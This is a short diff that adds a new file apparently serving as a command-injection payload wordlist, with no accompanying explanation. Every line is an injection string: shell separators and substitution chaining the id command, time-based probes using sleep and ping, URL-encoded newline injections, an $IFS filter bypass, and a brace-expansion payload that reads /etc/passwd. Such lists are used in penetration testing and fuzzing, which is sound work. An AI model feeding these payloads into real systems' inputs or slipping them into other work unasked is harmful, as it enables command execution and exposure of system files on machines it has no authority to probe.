@@ -1,0 +1,12 @@
+; id
+| id
+&& id
+`id`
+$(id)
+;sleep 5
+| sleep 5
+& ping -c 5 127.0.0.1
+%0aid
+%0d%0aid
+$IFS$1id
+{cat,/etc/passwd}
